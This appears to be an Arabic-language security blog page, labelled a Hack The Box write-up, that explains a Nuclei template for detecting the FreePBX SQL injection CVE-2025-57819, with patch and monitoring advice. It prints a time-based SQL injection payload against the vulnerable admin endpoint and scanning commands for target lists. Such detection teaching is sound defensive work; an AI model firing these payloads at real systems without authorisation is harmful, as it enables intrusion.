@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+  <meta name="theme-color" content="#07110d">
+  <meta name="color-scheme" content="dark light">
+  <meta name="description" content="تقرير CTF تقني لتحدي Connected HTB Write-up على منصة Hack The Box.">
+  <title>Connected HTB Write-up | Ft7y.Sec</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600;700&family=Tajawal:wght@300;400;500;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/aos/2.3.4/aos.css">
+  <link rel="stylesheet" href="../style.css">
+  <link rel="icon" href="../avatar.png" type="image/png">
+</head>
+<body>
+  <a class="skip-link" href="#main-content">تخطي إلى المحتوى</a>
+  <div class="scroll-progress" id="scroll-progress" aria-hidden="true"></div>
+  <div class="page-noise" aria-hidden="true"></div>
+  <canvas id="particles-canvas"></canvas>
+  <header class="navbar" id="navbar">
+    <div class="logo"><a href="../index.html#home">Ft7y<span>.Sec</span></a></div>
+    <nav class="nav-links" id="nav-menu" aria-label="التنقل الرئيسي"><ul>
+      <li><a href="../index.html#home">الرئيسية</a></li>
+      <li><a href="../pentest.html">اختبار الاختراق</a></li>
+      <li><a href="../appsec.html">أمن التطبيقات</a></li>
+      <li><a href="../automation.html">البرمجة والأتمتة</a></li>
+      <li><a href="../systems-labs.html">الأنظمة والمعامل</a></li>
+      <li><a href="../writeups.html">CTF Write-ups</a></li>
+      <li><a href="../index.html#contact">تواصل معي</a></li>
+    </ul></nav>
+    <div class="nav-actions">
+      <button id="theme-toggle" class="btn-secondary" type="button" title="تبديل الوضع" aria-label="تبديل الوضع"><i class="fa-solid fa-moon"></i></button>
+      <button class="mobile-toggle" id="mobile-toggle" type="button" aria-label="القائمة"><i class="fa-solid fa-bars"></i></button>
+    </div>
+  </header>
+  <main id="main-content" class="subpage-container ctf-report-page">
+    <article class="ctf-report-article">
+      <header class="subpage-hero ctf-report-hero" data-aos="fade-up">
+        <nav class="breadcrumb-nav" aria-label="مسار التنقل"><a href="../index.html"><i class="fa-solid fa-house"></i> الرئيسية</a><span class="sep">/</span><a href="index.html">تقارير CTF</a><span class="sep">/</span><span class="current">Connected HTB Write-up</span></nav>
+        <div class="writeup-header"><span class="platform-tag htb"><i class="fa-solid fa-cube"></i> Hack The Box</span><span class="ctf-directory-label"><i class="fa-solid fa-shield-halved"></i> بيئة تدريبية مصرح بها</span></div>
+        <h1 class="subpage-hero-title">Connected HTB Write-up</h1>
+        <p class="subpage-hero-desc">توثيق تقني محفوظ من المصدر الأصلي في Notion، يشمل الخطوات والأوامر والنتائج ولقطات الشاشة المتاحة.</p>
+        <a href="index.html" class="btn-outline ctf-back-link"><i class="fa-solid fa-arrow-right"></i> العودة إلى تقارير CTF</a>
+      </header>
+      <div class="ctf-report-content" data-aos="fade-up"><p>---</p><h3>&lt;mention-page url=&quot;https://app.notion.com/p/3bf7739eb41280f8a027c54e58673467&quot;&gt;صفحة &lt;/mention-page&gt; &lt;br&gt;&lt;br&gt;شرح تعليمي مبسط لقالب Nuclei: CVE-2025-57819</h3><h4>1. ما هو هذا القالب؟</h4><p>هذا ملف <strong>YAML</strong> مخصص لمحرك <strong>Nuclei</strong> (أداة فحص الثغرات الأمنية) للكشف عن ثغرة <strong>CVE-2025-57819</strong> في أنظمة <strong>FreePBX</strong> (نظام إدارة خوادم الاتصالات VoIP).</p><p><strong>معلومات أساسية عن الثغرة:</strong></p><ul class="ctf-report-list"><li><strong>النوع</strong>: SQL Injection غير مصدق (Unauthenticated) → يؤدي إلى RCE (تنفيذ كود عن بُعد)</li><li><strong>الخطورة</strong>: Critical (CVSS 10.0)</li><li><strong>الإصدارات المصابة</strong>: FreePBX \&lt; 15.0.66, \&lt; 16.0.89, \&lt; 17.0.3</li><li><strong>نقطة الضعف</strong>: ملف <code dir="ltr">admin/ajax.php</code> في وحدات <code dir="ltr">userman</code> أو <code dir="ltr">endpoint</code></li></ul><p>---</p><h4>2. هيكل الكود (الجزء الأول: Metadata)</h4><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">yaml</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>id: CVE-2025-57819
+
+info:
+  name: FreePBX Authentication Bypass / SQLi
+  author: [اسم المؤلف]
+  severity: critical
+  description: |
+    ثغرة SQL Injection في FreePBX
+    تسمح بتجاوز المصادقة وتنفيذ كود عن بُعد
+  reference:
+    - &lt;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-57819&gt;
+  tags: cve,cve2025,freepbx,rce,sqli</code></pre></section><p><strong>شرح كل قسم:</strong></p><p>&lt;table header-row=&quot;true&quot;&gt;</p><p>&lt;tr&gt;</p><p>&lt;td&gt;القسم&lt;/td&gt;</p><p>&lt;td&gt;المعنى&lt;/td&gt;</p><p>&lt;/tr&gt;</p><p>&lt;tr&gt;</p><p>&lt;td&gt;<code dir="ltr">id</code>&lt;/td&gt;</p><p>&lt;td&gt;معرف فريد للثغرة (رقم CVE)&lt;/td&gt;</p><p>&lt;/tr&gt;</p><p>&lt;tr&gt;</p><p>&lt;td&gt;<code dir="ltr">info</code>&lt;/td&gt;</p><p>&lt;td&gt;معلومات وصفية للتعريف بالقالب&lt;/td&gt;</p><p>&lt;/tr&gt;</p><p>&lt;tr&gt;</p><p>&lt;td&gt;<code dir="ltr">severity: critical</code>&lt;/td&gt;</p><p>&lt;td&gt;درجة الخطورة (حرجة)&lt;/td&gt;</p><p>&lt;/tr&gt;</p><p>&lt;tr&gt;</p><p>&lt;td&gt;<code dir="ltr">tags</code>&lt;/td&gt;</p><p>&lt;td&gt;وسوم للتصنيف والبحث السريع&lt;/td&gt;</p><p>&lt;/tr&gt;</p><p>&lt;/table&gt;</p><p>---</p><h4>3. الجزء الثاني: تعريف الطلب (Requests)</h4><p>هنا يُحدد القالب <strong>ما الذي سيرسله Nuclei</strong> إلى الهدف:</p><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">yaml</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>requests:
+  - method: POST
+    path:
+      - &quot;{{BaseURL}}/admin/ajax.php?module=userman&amp;command=checkPasswordReminder&quot;
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      username=admin&#39; OR SLEEP(5)-- -&amp;password=test</code></pre></section><p><strong>شرح تفصيلي:</strong></p><p>&lt;table header-row=&quot;true&quot;&gt;</p><p>&lt;tr&gt;</p><p>&lt;td&gt;العنصر&lt;/td&gt;</p><p>&lt;td&gt;الشرح&lt;/td&gt;</p><p>&lt;/tr&gt;</p><p>&lt;tr&gt;</p><p>&lt;td&gt;<code dir="ltr">method: POST</code>&lt;/td&gt;</p><p>&lt;td&gt;نوع الطلب HTTP (إرسال بيانات)&lt;/td&gt;</p><p>&lt;/tr&gt;</p><p>&lt;tr&gt;</p><p>&lt;td&gt;<code dir="ltr">{{BaseURL}}</code>&lt;/td&gt;</p><p>&lt;td&gt;متغير يستبدل بعنوان الهدف (مثلاً: <code dir="ltr">https://example.com</code>)&lt;/td&gt;</p><p>&lt;/tr&gt;</p><p>&lt;tr&gt;</p><p>&lt;td&gt;<code dir="ltr">/admin/ajax.php?module=userman&amp;command=checkPasswordReminder</code>&lt;/td&gt;</p><p>&lt;td&gt;نقطة النهاية (Endpoint) الضعيفة&lt;/td&gt;</p><p>&lt;/tr&gt;</p><p>&lt;tr&gt;</p><p>&lt;td&gt;<code dir="ltr">Content-Type</code>&lt;/td&gt;</p><p>&lt;td&gt;نوع البيانات المرسلة (نموذج ويب)&lt;/td&gt;</p><p>&lt;/tr&gt;</p><p>&lt;tr&gt;</p><p>&lt;td&gt;<code dir="ltr">body</code>&lt;/td&gt;</p><p>&lt;td&gt;<strong>حمولة الاختبار (Payload)</strong>&lt;/td&gt;</p><p>&lt;/tr&gt;</p><p>&lt;/table&gt;</p><p><strong>ما معنى الحمولة؟</strong></p><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">plain text</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>username=admin&#39; OR SLEEP(5)-- -&amp;password=test</code></pre></section><ul class="ctf-report-list"><li><code dir="ltr">admin&#39;</code> → إغلاق الاقتباس في استعلام SQL</li><li><code dir="ltr">OR SLEEP(5)</code> → إضافة شرط: &quot;أو انتظر 5 ثوانٍ&quot;</li><li><code dir="ltr">- -</code> → تعليق بقية الاستعلام (تعطيله)</li><li><strong>الهدف</strong>: إذا كان النظام مصاباً، سيتأخر الرد <strong>5 ثوانٍ</strong> بسبب تنفيذ <code dir="ltr">SLEEP(5)</code> في قاعدة البيانات</li></ul><p>---</p><h4>4. الجزء الثالث: المطابقات (Matchers)</h4><p>هنا يُحدد القالب <strong>كيف يعرف Nuclei أن الثغرة موجودة</strong>:</p><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">yaml</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - &quot;duration&gt;=5&quot;
+      - type: status
+        status:
+          - 200</code></pre></section><p><strong>شرح المطابقات:</strong></p><p>&lt;table header-row=&quot;true&quot;&gt;</p><p>&lt;tr&gt;</p><p>&lt;td&gt;المطابقة&lt;/td&gt;</p><p>&lt;td&gt;الشرح&lt;/td&gt;</p><p>&lt;/tr&gt;</p><p>&lt;tr&gt;</p><p>&lt;td&gt;<code dir="ltr">matchers-condition: and</code>&lt;/td&gt;</p><p>&lt;td&gt;يجب <strong>تحقق كلتا الشرطين</strong> معاً&lt;/td&gt;</p><p>&lt;/tr&gt;</p><p>&lt;tr&gt;</p><p>&lt;td&gt;<code dir="ltr">type: dsl</code> + <code dir="ltr">duration&gt;=5</code>&lt;/td&gt;</p><p>&lt;td&gt;شرط مخصص: <strong>مدة الرد ≥ 5 ثوانٍ</strong> (Time-based Detection)&lt;/td&gt;</p><p>&lt;/tr&gt;</p><p>&lt;tr&gt;</p><p>&lt;td&gt;<code dir="ltr">type: status</code> + <code dir="ltr">200</code>&lt;/td&gt;</p><p>&lt;td&gt;رمز الحالة HTTP يجب أن يكون 200 (OK)&lt;/td&gt;</p><p>&lt;/tr&gt;</p><p>&lt;/table&gt;</p><p><strong>لماذا Time-based؟</strong></p><ul class="ctf-report-list"><li>هذه الطريقة <strong>آمنة</strong> و<strong>غير مدمرة</strong> (Non-destructive)</li><li>لا تغير أي شيء في قاعدة البيانات</li><li>تعتمد على <strong>الزمن</strong>: إذا تأخر الرد 5 ثوانٍ، فهذا يعني أن <code dir="ltr">SLEEP(5)</code> نُفذ → الثغرة موجودة</li></ul><p>---</p><h4>5. الجزء الرابع: الاستخراج (Extractors) - اختياري</h4><p>في بعض النسخ، يُضاف قسم لاستخراج معلومات إضافية:</p><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">yaml</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>    extractors:
+      - type: regex
+        part: body
+        regex:
+          - &quot;uid=([0-9]+)&quot;</code></pre></section><p><strong>الهدف</strong>: استخراج معرف المستخدم أو بيانات أخرى من الرد للتأكيد.</p><p>---</p><h4>6. كيف تستخدم هذا القالب؟ (الخطوات العملية)</h4><h4>الخطوة 1: تثبيت Nuclei</h4><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">bash</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code># على Kali Linux
+sudo apt update &amp;&amp; sudo apt install nuclei -y
+
+# أو باستخدام Docker
+docker run projectdiscovery/nuclei -v</code></pre></section><h4>الخطوة 2: تحميل القالب</h4><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">bash</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code># تحميل الملف مباشرة (إذا كان متاحاً)
+wget &lt;https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/main/http/cves/2025/CVE-2025-57819.yaml&gt;
+
+# أو استنساخ المستودع كاملاً
+git clone &lt;https://github.com/projectdiscovery/nuclei-templates.git&gt;</code></pre></section><h4>الخطوة 3: تشغيل الفحص</h4><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">bash</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code># فحص هدف واحد
+nuclei -u &lt;https://target.com&gt; -t CVE-2025-57819.yaml
+
+# فحص مع تفاصيل تصحيح (للتعلم)
+nuclei -u &lt;https://target.com&gt; -t CVE-2025-57819.yaml -vv -debug
+
+# فحص قائمة أهداف
+nuclei -l targets.txt -t CVE-2025-57819.yaml</code></pre></section><h4>الخطوة 4: فهم النتائج</h4><p>إذا ظهرت النتيجة:</p><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">plain text</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>[CVE-2025-57819] [http] [critical] &lt;https://target.com/admin/ajax.php?module=userman&amp;command=checkPasswordReminder&gt;
+[CVE-2025-57819] [elapsed] Time-based SQLi detected (delay &gt;=5s)</code></pre></section><p>→ هذا يعني أن النظام <strong>مصاب</strong> ويحتاج إلى <strong>تحديث فوري</strong></p><p>---</p><h4>7. ملاحظات أمنية مهمة جداً</h4><p>&gt; ⚠️ <strong>تحذير قانوني وأخلاقي:</strong></p><ul class="ctf-report-list"><li>استخدم هذا القالب <strong>فقط</strong> على أنظمة <strong>تملكها</strong> أو <strong>لديك تصريح رسمي</strong> بفحصها</li><li>CVE-2025-57819 هي <strong>Zero-day</strong> تم استغلالها في البرية (Actively Exploited)</li><li>إذا كان FreePBX الخاص بك متصلاً بالإنترنت وغير محدّث، <strong>افترض أنه تم اختراقه</strong></li></ul><p>---</p><h4>8. كيف تحمي نفسك؟</h4><ol class="ctf-report-list"><li><strong>التحديث الفوري</strong> إلى:</li></ol><ul class="ctf-report-list"><li>FreePBX 15.0.66 أو أحدث</li><li>FreePBX 16.0.89 أو أحدث</li><li>FreePBX 17.0.3 أو أحدث</li></ul><ol class="ctf-report-list"><li><strong>حظر الوصول</strong> للوحة الإدارة من الإنترنت (استخدم VPN أو IP whitelist)</li><li><strong>المراقبة</strong>: راجع السجلات بحثاً عن:</li></ol><ul class="ctf-report-list"><li>طلبات POST غير طبيعية إلى <code dir="ltr">ajax.php</code></li><li>ملفات مشبوهة مثل <code dir="ltr">/var/www/html/.clean.sh</code></li><li>حسابات إدارية جديدة غير معروفة</li></ul><p>---</p><h4>9. ملخص سريع (الخريطة الذهنية)</h4><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">plain text</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>CVE-2025-57819
+    │
+    ├── النظام: FreePBX (15/16/17)
+    │
+    ├── الثغرة: SQL Injection غير مصدق
+    │
+    ├── النقطة الضعيفة: /admin/ajax.php?module=userman&amp;command=checkPasswordReminder
+    │
+    ├── طريقة الكشف: Time-based (SLEEP(5))
+    │
+    ├── النتيجة: RCE (تنفيذ كود عن بُعد)
+    │
+    └── الحل: التحديث + حظر الوصول العام</code></pre></section><p>---</p></div>
+      <footer class="ctf-report-end"><a href="index.html" class="btn-primary"><i class="fa-solid fa-arrow-right"></i> كل تقارير CTF</a></footer>
+    </article>
+  </main>
+  <footer class="footer"><div class="footer-content">
+    <div class="footer-logo">Ft7y<span>.Sec</span></div>
+    <div class="footer-links">
+      <a href="../index.html#home">الرئيسية</a><a href="../pentest.html">اختبار الاختراق</a><a href="../appsec.html">أمن التطبيقات</a><a href="../automation.html">البرمجة والأتمتة</a><a href="../systems-labs.html">الأنظمة والمعامل</a><a href="../writeups.html">CTF Write-ups</a>
+    </div>
+    <p>© 2026 Ft7y.Sec. جميع الحقوق محفوظة.</p>
+  </div></footer>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/aos/2.3.4/aos.js"></script>
+  <script src="../script.js"></script>
+</body>
+</html>
